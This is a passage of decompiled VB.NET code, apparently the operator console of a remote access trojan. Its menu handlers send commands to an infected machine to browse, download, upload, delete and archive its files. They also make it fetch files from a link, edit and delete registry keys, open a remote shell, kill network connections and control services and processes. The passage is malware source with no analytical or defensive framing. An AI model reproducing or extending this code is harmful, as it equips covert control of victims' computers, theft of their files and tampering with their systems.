					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					flag = (Operators.CompareString(listViewItem.Text, "..", False) <> 0 AndAlso Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0)
					If flag Then
						text = text + "*" + listViewItem.ToolTipText
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				flag = (TypeOf enumerator Is IDisposable)
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			flag = (Operators.CompareString(text, String.Empty, False) <> 0)
			If flag Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = True
			End If
		End Sub

		' Token: 0x060003E2 RID: 994 RVA: 0x00168478 File Offset: 0x00166878
		Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.Flist, String.Empty, False) <> 0
			If flag Then
				Dim flag2 As Boolean = Me.isCut
				If flag2 Then
					Dim client As Client = Me.sk
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "mv"
					array(5) = Class7.string_1
					Dim array2 As String() = array
					Dim num As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array2(num) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					array(8) = Class6.smethod_14(Me.Flist)
					client.Send(String.Concat(array))
				Else
					Dim client2 As Client = Me.sk
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "cp"
					array(5) = Class7.string_1
					Dim array3 As String() = array
					Dim num2 As Integer = 6
					Dim text As String = (Me.TextBox1.Text + "\").Replace("\\", "\")
					array3(num2) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					array(8) = Class6.smethod_14(Me.Flist)
					client2.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x060003E3 RID: 995 RVA: 0x001685EC File Offset: 0x001669EC
		Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.Text, "..", False) <> 0 AndAlso Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0
					If flag Then
						Dim array As String() = New String(8) {}
						array(0) = "Ex"
						array(1) = Class7.string_1
						array(2) = "fm"
						array(3) = Class7.string_1
						array(4) = "dw"
						array(5) = Class7.string_1
						Dim listViewItem2 As ListViewItem = listViewItem
						Dim toolTipText As String = listViewItem2.ToolTipText
						listViewItem2.ToolTipText = toolTipText
						array(6) = Class6.smethod_14(toolTipText)
						array(7) = Class7.string_1
						array(8) = Me.sk.ip()
						Me.sk.Send(String.Concat(array))
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060003E4 RID: 996 RVA: 0x00168728 File Offset: 0x00166B28
		Private Sub UploadToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.Items.Count = 0
				If Not flag Then
					Dim text As String = Me.TextBox1.Text
					Dim openFileDialog As OpenFileDialog = New OpenFileDialog()
					openFileDialog.FileName = String.Empty
					openFileDialog.Multiselect = True
					flag = (openFileDialog.ShowDialog() = DialogResult.OK)
					If flag Then
						Dim fileNames As String() = openFileDialog.FileNames
						Dim num As Integer = 0
						Dim num2 As Integer = fileNames.Length - 1
						Dim num3 As Integer = num
						While True
							Dim num4 As Integer = num3
							Dim num5 As Integer = num2
							If num4 > num5 Then
								Exit For
							End If
							Dim text2 As String = fileNames(num3)
							flag = (FileSystem.FileLen(text2) <> 0L)
							If flag Then
								Dim up As up = New up()
								up.TMP = text2
								up.FN = (text + "\" + New FileInfo(text2).Name).Replace("\\", "\")
								up.Name = Me.sk.ip() + Class6.smethod_14(up.FN)
								up.osk = Me.sk
								up.SZ = CInt(FileSystem.FileLen(up.TMP))
								up.Text = New FileInfo(up.TMP).Name + " >> " + up.FN
								up.Show()
							End If
							num3 += 1
						End While
					End If
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003E5 RID: 997 RVA: 0x001688B8 File Offset: 0x00166CB8
		Private Sub NewEmptyFileToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1)
			Dim flag As Boolean = text.Length <> 0
			If flag Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nf"
				array(5) = Class7.string_1
				Dim array2 As String() = array
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array2(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x060003E6 RID: 998 RVA: 0x0016895C File Offset: 0x00166D5C
		Private Sub NewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1)
			Dim flag As Boolean = text.Length <> 0
			If flag Then
				Dim client As Client = Me.sk
				Dim array As String() = New String(6) {}
				array(0) = "Ex"
				array(1) = Class7.string_1
				array(2) = "fm"
				array(3) = Class7.string_1
				array(4) = "nd"
				array(5) = Class7.string_1
				Dim array2 As String() = array
				Dim num As Integer = 6
				Dim text2 As String = Me.TextBox1.Text + text
				array2(num) = Class6.smethod_14(text2)
				client.Send(String.Concat(array))
			End If
		End Sub

		' Token: 0x060003E7 RID: 999 RVA: 0x00168A00 File Offset: 0x00166E00
		Private Sub OpenDownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Directory.Exists(Me.string_0)
			If flag Then
				Directory.CreateDirectory(Me.string_0)
			End If
			Try
				Process.Start(Me.string_0)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003E8 RID: 1000 RVA: 0x00168A60 File Offset: 0x00166E60
		Private Sub RarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rar", Class7.string_1 })
				Dim text2 As String = Interaction.InputBox("Enter Rar Name", String.Empty, New DirectoryInfo(Me.TextBox1.Text).Name + ".rar", -1, -1)
				flag = (Operators.CompareString(text2, String.Empty, False) <> 0)
				If flag Then
					Dim textBox As TextBox = Me.TextBox1
					Dim text3 As String = textBox.Text
					textBox.Text = text3
					text = String.Concat(New String() { text, Class6.smethod_14(text2), Class7.string_1, Class6.smethod_14(text3), Class7.string_1 })
					Dim str As String = "a -y """ + text2 + """"
					Try
						For Each obj As Object In Me.L2.SelectedItems
							Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
							str = str + " """ + listViewItem.Text + """"
						Next
					Finally
						Dim enumerator As IEnumerator
						flag = (TypeOf enumerator Is IDisposable)
						If flag Then
							TryCast(enumerator, IDisposable).Dispose()
						End If
					End Try
					text += Class6.smethod_14(str)
					Me.sk.Send(text)
				End If
			End If
		End Sub

		' Token: 0x060003E9 RID: 1001 RVA: 0x00168C28 File Offset: 0x00167028
		Private Sub UnRarToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count <> 0
			If flag Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				Dim toolTipText As String = listViewItem.ToolTipText
				listViewItem.ToolTipText = toolTipText
				Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "unrar", Class7.string_1 }) + Class6.smethod_14(toolTipText)
				Me.sk.Send(s)
			End If
		End Sub

		' Token: 0x060003EA RID: 1002 RVA: 0x00168CD4 File Offset: 0x001670D4
		Private Sub UploadFromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, String.Empty, False) <> 0
			If flag Then
				Dim fromLink As FromLink = New FromLink()
				fromLink.ShowDialog(Me)
				flag = fromLink.IsOK
				If flag Then
					Dim array As String() = New String(8) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "fl"
					array(5) = Class7.string_1
					Dim textBox As TextBox = fromLink.TextBox1
					Dim text As String = textBox.Text
					textBox.Text = text
					array(6) = Class6.smethod_14(text)
					array(7) = Class7.string_1
					Dim array2 As String() = array
					Dim num As Integer = 8
					Dim text2 As String = Me.TextBox1.Text + fromLink.TextBox2.Text
					array2(num) = Class6.smethod_14(text2)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x060003EB RID: 1003 RVA: 0x00168DCC File Offset: 0x001671CC
		Private Sub RGk_NodeMouseClick(sender As Object, e As TreeNodeMouseClickEventArgs)
			Dim flag As Boolean = e.Button = MouseButtons.Left
			If flag Then
				Dim isExpanded As Boolean = e.Node.IsExpanded
				If isExpanded Then
					e.Node.Collapse()
				Else
					e.Node.Expand()
				End If
			End If
		End Sub

		' Token: 0x060003EC RID: 1004 RVA: 0x00168E18 File Offset: 0x00167218
		Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.ListView1.SelectedItems.Count <> 0
				If flag Then
					Me.cur = CType(Me.ListView1.SelectedIndices(0), Manager.CR)
					Select Case Me.cur
						Case Manager.CR.fm
							Me.FMM.BringToFront()
							Me.LPR.SendToBack()
							Me.LTCP.SendToBack()
							Me.RG.SendToBack()
							Me.RG.SendToBack()
							Me.sh.SendToBack()
							Me.LSRV.SendToBack()
							Me.L2.method_3()
						Case Manager.CR.PR
							Me.LPR.BringToFront()
							Me.LPR.method_3()
						Case Manager.CR.tcp
							Me.LTCP.BringToFront()
							Me.LTCP.method_3()
						Case Manager.CR.reg
							Me.RG.BringToFront()
						Case Manager.CR.shl
							Me.sh.BringToFront()
							flag = (Me.shStarted = 0)
							If flag Then
								Me.shStarted = 1
								Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "~" }))
							End If
						Case Manager.CR.srv
							Me.LSRV.BringToFront()
							Me.LSRV.method_3()
					End Select
					Me.Icon = Icon.FromHandle(CType(Me.vmethod_148.Images(Me.ListView1.SelectedItems(0).ImageIndex), Bitmap).GetHicon())
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003ED RID: 1005 RVA: 0x0016904C File Offset: 0x0016744C
		Private Sub KillConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "!" })
			Dim flag As Boolean = Me.LTCP.SelectedItems.Count <> 0
			If flag Then
				Try
					For Each obj As Object In Me.LTCP.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Tag.ToString()
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x060003EE RID: 1006 RVA: 0x00169138 File Offset: 0x00167538
		Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
		End Sub

		' Token: 0x060003EF RID: 1007 RVA: 0x00169190 File Offset: 0x00167590
		Private Sub CreateKeyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing AndAlso Me.RGk.SelectedNode.FullPath.Contains("\")
			If flag Then
				Dim text As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
				flag = (text.Length <> 0)
				If flag Then
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "#", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
				End If
			End If
		End Sub

		' Token: 0x060003F0 RID: 1008 RVA: 0x00169304 File Offset: 0x00167704
		Private Sub DeleteSelectedToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing
			If flag Then
				Dim fullPath As String = Me.RGk.SelectedNode.FullPath
				flag = fullPath.Contains("\")
				If flag Then
					Dim text As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1)
					Dim text2 As String = String.Empty
					Dim num As Integer = Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2
					For i As Integer = 0 To num
						text2 = text2 + Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) + "\"
					Next
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "$", Class7.string_1, text2, Class7.string_1, text }))
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, text, "\" }))
				End If
			End If
		End Sub

		' Token: 0x060003F1 RID: 1009 RVA: 0x001694B0 File Offset: 0x001678B0
		Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.LSRV.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "!", text }))
			End If
		End Sub

		' Token: 0x060003F2 RID: 1010 RVA: 0x001695A0 File Offset: 0x001679A0
		Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.LSRV.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "@", text }))
			End If
		End Sub

		' Token: 0x060003F3 RID: 1011 RVA: 0x00169690 File Offset: 0x00167A90
		Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.LSRV.SelectedItems.Count <> 0
			If flag Then
				Dim text As String = String.Empty
				Try
					For Each obj As Object In Me.LSRV.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						text = text + Class7.string_1 + listViewItem.Text
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "#", text }))
			End If
		End Sub

		' Token: 0x060003F4 RID: 1012 RVA: 0x00169780 File Offset: 0x00167B80
		Private Sub EditToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
			If flag Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rd" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						flag = (Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0)
						If flag Then
							Dim listViewItem2 As ListViewItem = listViewItem
							Dim toolTipText As String = listViewItem2.ToolTipText
							listViewItem2.ToolTipText = toolTipText
							text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
						End If
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x060003F5 RID: 1013 RVA: 0x001698A8 File Offset: 0x00167CA8
		Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing
			If flag Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x060003F6 RID: 1014 RVA: 0x00169958 File Offset: 0x00167D58
		Private Sub vmethod_26_Tick(sender As Object, e As EventArgs)
			Me.vmethod_26.Enabled = False
			Dim flag As Boolean = Me.sk Is Nothing
			If flag Then
				Me.Close()
			Else
				flag = Not Me.sk.CN
				If flag Then
					Me.Close()
				Else
					Try
						Select Case Me.cur
							Case Manager.CR.PR
								Me.vmethod_26.Interval = 2000
								flag = Not Me.PRNXT
								If Not flag Then
									Dim enumerator As IEnumerator = Me.LPR.Items.GetEnumerator()
									Dim text As String = String.Empty
									While True
										flag = enumerator.MoveNext()
										If Not flag Then
											Exit For
										End If
										Dim listViewItem As ListViewItem = CType(enumerator.Current, ListViewItem)
										flag = (listViewItem IsNot Nothing)
										If flag Then
											text = text + Class7.string_1 + listViewItem.SubItems(1).Text
										End If
									End While
									Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "U", text }))
									Me.PRNXT = False
								End If
							Case Manager.CR.tcp
								Me.vmethod_26.Interval = 2000
								flag = Me.TCPNXT
								If flag Then
									Dim text2 As String = String.Concat(New String() { "Ex", Class7.string_1, "tcp", Class7.string_1, "~", Class7.string_1 })
									Try
										For Each obj As Object In Me.LTCP.Items
											Dim listViewItem2 As ListViewItem = CType(obj, ListViewItem)
											text2 = text2 + listViewItem2.Tag.ToString() + Class7.string_1
										Next
									Finally
										Dim enumerator2 As IEnumerator
										flag = (TypeOf enumerator2 Is IDisposable)
										If flag Then
											TryCast(enumerator2, IDisposable).Dispose()
										End If
									End Try
									Me.sk.Send(text2)
									Me.TCPNXT = False
								End If
							Case Manager.CR.srv
								Me.vmethod_26.Interval = 4000
								flag = Me.srvNxt
								If flag Then
									Dim s As String = String.Concat(New String() { "Ex", Class7.string_1, "srv", Class7.string_1, "~" })
									Me.sk.Send(s)
									Me.srvNxt = False
								End If
						End Select
					Catch ex As Exception
					End Try
					Me.vmethod_26.Enabled = True
				End If
			End If
		End Sub

		' Token: 0x060003F7 RID: 1015 RVA: 0x00169CB4 File Offset: 0x001680B4
		Private Sub L1_DoubleClick1(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedItems.Count <> 0
			If flag Then
				Me.exp(Me.L1.SelectedItems(0).ToolTipText, False)
			End If
		End Sub

		' Token: 0x060003F8 RID: 1016 RVA: 0x00169CFC File Offset: 0x001680FC
		Private Sub DeleteToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Me.L2.SelectedItems.Count <= 0
				If Not flag Then
					Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "dl", Class7.string_1 })
					Try
						Try
							For Each obj As Object In Me.L2.SelectedItems
								Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
								flag = (Operators.CompareString(listViewItem.Text, "..", False) <> 0)
								If flag Then
									Dim flag2 As Boolean = Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0
									If flag2 Then
										Dim str As String = text
										Dim str2 As String = Class7.string_1
										Dim text2 As String = listViewItem.ToolTipText + "*!"
										Dim str3 As String = Class6.smethod_14(text2)
										text = str + str2 + str3
									Else
										Dim str4 As String = text
										Dim str5 As String = Class7.string_1
										Dim text3 As String = listViewItem.ToolTipText + "*"
										Dim str6 As String = Class6.smethod_14(text3)
										text = str4 + str5 + str6
									End If
								End If
							Next
						Finally
							Dim enumerator As IEnumerator
							Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
							If flag2 Then
								TryCast(enumerator, IDisposable).Dispose()
							End If
						End Try
					Finally
						Dim enumerator2 As IEnumerator
						Dim flag2 As Boolean = TypeOf enumerator2 Is IDisposable
						If flag2 Then
							TryCast(enumerator2, IDisposable).Dispose()
						End If
					End Try
					Me.sk.Send(text)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060003F9 RID: 1017 RVA: 0x00169F10 File Offset: 0x00168310
		Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.RGLIST.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "@", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, listViewItem.Text }))
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060003FA RID: 1018 RVA: 0x0016A000 File Offset: 0x00168400
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Enter Name!", "New Process", "", -1, -1)
			Dim flag As Boolean = Operators.CompareString(text, "", False) = 0
			If Not flag Then
				NewLateBinding.LateCall(Me.sk, Nothing, "Send", New Object() { Operators.ConcatenateObject(Operators.ConcatenateObject("nwpr", MyProject.Forms.Form1.Yy), text) }, Nothing, Nothing, Nothing, True)
			End If
		End Sub

		' Token: 0x04000159 RID: 345
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400015B RID: 347
		<AccessedThroughProperty("StatusStrip1")>
		Private _StatusStrip1 As StatusStrip

		' Token: 0x0400015C RID: 348
		<AccessedThroughProperty("SL")>
		Private _SL As ToolStripStatusLabel

		' Token: 0x0400015D RID: 349
		<AccessedThroughProperty("pr")>
		Private _pr As ToolStripProgressBar

		' Token: 0x0400015E RID: 350
		<AccessedThroughProperty("M1")>
		Private _M1 As ContextMenuStrip

		' Token: 0x0400015F RID: 351
		<AccessedThroughProperty("KillToolStripMenuItem1")>
		Private _KillToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x04000160 RID: 352
		<AccessedThroughProperty("KillDeleteToolStripMenuItem")>
		Private _KillDeleteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000161 RID: 353
		<AccessedThroughProperty("RestartProcessToolStripMenuItem")>
		Private _RestartProcessToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000162 RID: 354
		<AccessedThroughProperty("vmethod_26")>
		Private _vmethod_26 As Timer

		' Token: 0x04000163 RID: 355
		<AccessedThroughProperty("ImageList1")>
		Private _ImageList1 As ImageList

		' Token: 0x04000164 RID: 356
		<AccessedThroughProperty("ContextMenuStrip1")>
		Private _ContextMenuStrip1 As ContextMenuStrip

		' Token: 0x04000165 RID: 357
		<AccessedThroughProperty("KillConnectionToolStripMenuItem")>
		Private _KillConnectionToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000166 RID: 358
		<AccessedThroughProperty("crg")>
		Private _crg As ContextMenuStrip

		' Token: 0x04000167 RID: 359
		<AccessedThroughProperty("RefreshToolStripMenuItem")>
		Private _RefreshToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000168 RID: 360
		<AccessedThroughProperty("EditToolStripMenuItem")>
		Private _EditToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000169 RID: 361
		<AccessedThroughProperty("NewValueToolStripMenuItem")>
		Private _NewValueToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400016A RID: 362
		<AccessedThroughProperty("DeleteToolStripMenuItem")>
		Private _DeleteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400016B RID: 363
		<AccessedThroughProperty("rimg")>
		Private _rimg As ImageList

		' Token: 0x0400016C RID: 364
		<AccessedThroughProperty("crgk")>
		Private _crgk As ContextMenuStrip

		' Token: 0x0400016D RID: 365
		<AccessedThroughProperty("RefreshToolStripMenuItem1")>
		Private _RefreshToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x0400016E RID: 366
		<AccessedThroughProperty("CreateKeyToolStripMenuItem")>
		Private _CreateKeyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400016F RID: 367
		<AccessedThroughProperty("DeleteSelectedToolStripMenuItem")>
		Private _DeleteSelectedToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000170 RID: 368
		<AccessedThroughProperty("ContextMenuStrip2")>
		Private _ContextMenuStrip2 As ContextMenuStrip

		' Token: 0x04000171 RID: 369
		<AccessedThroughProperty("StopToolStripMenuItem")>
		Private _StopToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000172 RID: 370
		<AccessedThroughProperty("PauseToolStripMenuItem")>
		Private _PauseToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000173 RID: 371
		<AccessedThroughProperty("StartToolStripMenuItem")>
		Private _StartToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000174 RID: 372
		<AccessedThroughProperty("ContextMenuStrip3")>
		Private _ContextMenuStrip3 As ContextMenuStrip

		' Token: 0x04000175 RID: 373
		<AccessedThroughProperty("UPToolStripMenuItem")>
		Private _UPToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000176 RID: 374
		<AccessedThroughProperty("RefreshToolStripMenuItem2")>
		Private _RefreshToolStripMenuItem2 As ToolStripMenuItem

		' Token: 0x04000177 RID: 375
		<AccessedThroughProperty("RunToolStripMenuItem")>
		Private _RunToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000178 RID: 376
		<AccessedThroughProperty("Delete")>
		Private _Delete As ToolStripMenuItem

		' Token: 0x04000179 RID: 377
		<AccessedThroughProperty("EditToolStripMenuItem1")>
		Private _EditToolStripMenuItem1 As ToolStripMenuItem

		' Token: 0x0400017A RID: 378
		<AccessedThroughProperty("RenameToolStripMenuItem")>
		Private _RenameToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400017B RID: 379
		<AccessedThroughProperty("CopyToolStripMenuItem")>
		Private _CopyToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400017C RID: 380
		<AccessedThroughProperty("CutToolStripMenuItem")>
		Private _CutToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400017D RID: 381
		<AccessedThroughProperty("PasteToolStripMenuItem")>
		Private _PasteToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400017E RID: 382
		<AccessedThroughProperty("DownloadToolStripMenuItem")>
		Private _DownloadToolStripMenuItem As ToolStripMenuItem

		' Token: 0x0400017F RID: 383
		<AccessedThroughProperty("UploadToolStripMenuItem")>
		Private _UploadToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000180 RID: 384
		<AccessedThroughProperty("NewEmptyFileToolStripMenuItem")>
		Private _NewEmptyFileToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000181 RID: 385
		<AccessedThroughProperty("NewFolderToolStripMenuItem")>
		Private _NewFolderToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000182 RID: 386
		<AccessedThroughProperty("OpenDownloadsToolStripMenuItem")>
		Private _OpenDownloadsToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000183 RID: 387
		<AccessedThroughProperty("RarToolStripMenuItem")>
		Private _RarToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000184 RID: 388
		<AccessedThroughProperty("UnRarToolStripMenuItem")>
		Private _UnRarToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000185 RID: 389
		<AccessedThroughProperty("UploadFromLinkToolStripMenuItem")>
		Private _UploadFromLinkToolStripMenuItem As ToolStripMenuItem

		' Token: 0x04000186 RID: 390
		<AccessedThroughProperty("ContextMenuStrip4")>
		Private _ContextMenuStrip4 As ContextMenuStrip

		' Token: 0x04000187 RID: 391
		<AccessedThroughProperty("RefreshToolStripMenuItem3")>
		Private _RefreshToolStripMenuItem3 As ToolStripMenuItem

		' Token: 0x04000188 RID: 392
		<AccessedThroughProperty("MG")>
		Private _MG As ImageList

		' Token: 0x04000189 RID: 393
		<AccessedThroughProperty("ListView1")>
		Private _ListView1 As ListView

		' Token: 0x0400018A RID: 394
		<AccessedThroughProperty("ColumnHeader1")>
		Private _ColumnHeader1 As ColumnHeader

		' Token: 0x0400018B RID: 395
		<AccessedThroughProperty("ColumnHeader2")>
		Private _ColumnHeader2 As ColumnHeader

		' Token: 0x0400018C RID: 396
		<AccessedThroughProperty("vmethod_148")>
		Private _vmethod_148 As ImageList

		' Token: 0x0400018D RID: 397
		<AccessedThroughProperty("Timer1")>
		Private _Timer1 As Timer

		' Token: 0x0400018E RID: 398
		<AccessedThroughProperty("FMM")>
		Private _FMM As Panel

		' Token: 0x0400018F RID: 399
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

